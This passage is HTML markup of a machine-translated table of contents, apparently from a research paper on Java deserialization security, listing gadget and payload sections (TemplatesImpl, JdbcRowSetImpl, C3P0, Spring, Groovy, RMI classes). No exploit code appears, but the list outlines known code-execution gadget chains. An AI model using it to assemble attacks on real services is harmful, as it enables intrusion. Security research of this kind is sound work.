<div style="position:absolute;top:1954;left:224"><nobr><a href="https://translate.googleusercontent.com/translate_f#14"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.4 json-io </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">14</font></font></font></nobr></div>
<div style="position:absolute;top:1971;left:224"><nobr><a href="https://translate.googleusercontent.com/translate_f#15"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.5 XStream </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">15</font></font></font></nobr></div>
<div style="position:absolute;top:2004;left:167"><nobr><b><a href="https://translate.googleusercontent.com/translate_f#16"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4 小工具/有效载荷</font></font></a></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:2004;left:709"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:2022;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#16"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1 常见的</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">16</font></font></font></nobr></div>
<div style="position:absolute;top:2040;left:224"><nobr><a href="https://translate.googleusercontent.com/translate_f#16"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.1 Xalan TemplatesImpl </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">16</font></font></font></nobr></div>
<div style="position:absolute;top:2058;left:224"><nobr><a href="https://translate.googleusercontent.com/translate_f#17"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.2 通过 JNDI 引用执行代码</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">17</font></font></font></nobr></div>
<div style="position:absolute;top:2076;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.2 com.sun.rowset.JdbcRowSetImpl </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">18</font></font></font></nobr></div>
<div style="position:absolute;top:2094;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3 java.util.ServiceLoader$LazyIterator </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">18</font></font></font></nobr></div>
<div style="position:absolute;top:2112;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#19"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.4 com.sun.jndi.rmi.registry.BindingEnumeration </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">19</font></font></font></nobr></div>
<div style="position:absolute;top:2130;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#20"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.5 com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">20</font></font></font></nobr></div>
<div style="position:absolute;top:2148;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#20"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.6 javax.imageio.ImageIO$ContainsFilter </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">20</font></font></font></nobr></div>
<div style="position:absolute;top:2166;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.7 公共配置 JNDIConfiguration </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">21</font></font></font></nobr></div>
<div style="position:absolute;top:2184;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.8 C3P0 JndiRefForwardingDataSource </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">21</font></font></font></nobr></div>
<div style="position:absolute;top:2202;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.9 C3P0 WrapperConnectionPoolDataSource </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">21</font></font></font></nobr></div>
<div style="position:absolute;top:2220;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.10 Spring Beans PropertyPathFactoryBean </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">22</font></font></font></nobr></div>
<div style="position:absolute;top:2237;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.11 Spring AOP PartiallyComparableAdvisorHolder </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">22</font></font></font></nobr></div>
<div style="position:absolute;top:2255;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#23"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.12 Spring AOP AbstractBeanFactoryPointcutAdvisor </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">23</font></font></font></nobr></div>
<div style="position:absolute;top:2273;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#23"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.13 Spring DefaultListableBeanFactory </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">23</font></font></font></nobr></div>
<div style="position:absolute;top:2291;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#24"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.14 Apache XBean </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">24</font></font></font></nobr></div>
<div style="position:absolute;top:2309;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#24"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.15 Caucho 树脂</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">24</font></font></font></nobr></div>
<div style="position:absolute;top:2327;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#25"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.16 javax.script.ScriptEngineManager </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">25</font></font></font></nobr></div>
<div style="position:absolute;top:2345;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#25"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.17 Commons Beanutils BeanComparator </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">25</font></font></font></nobr></div>
<div style="position:absolute;top:2363;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#26"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.18 罗马 EqualsBean/ToStringBean </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">26</font></font></font></nobr></div>
<div style="position:absolute;top:2381;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#26"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.19 Groovy Expando/MethodClosure </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">26</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:2451;left:443"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:2699;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="3"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 3 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:2862;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#27"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.20 sun.rmi.server.UnicastRef(2) </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">27</font></font></font></nobr></div>
<div style="position:absolute;top:2879;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#27"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.21 java.rmi.server.UnicastRemoteObject </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">27</font></font></font></nobr></div>
<div style="position:absolute;top:2912;left:167"><nobr><b><a href="https://translate.googleusercontent.com/translate_f#29"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5 进一步互动</font></font></a></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:2912;left:709"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">29</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:2930;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#29"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.1 编组 Getter 调用</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">29</font></font></font></nobr></div>
<div style="position:absolute;top:2948;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#29"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.2 Java“重新”序列化</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: 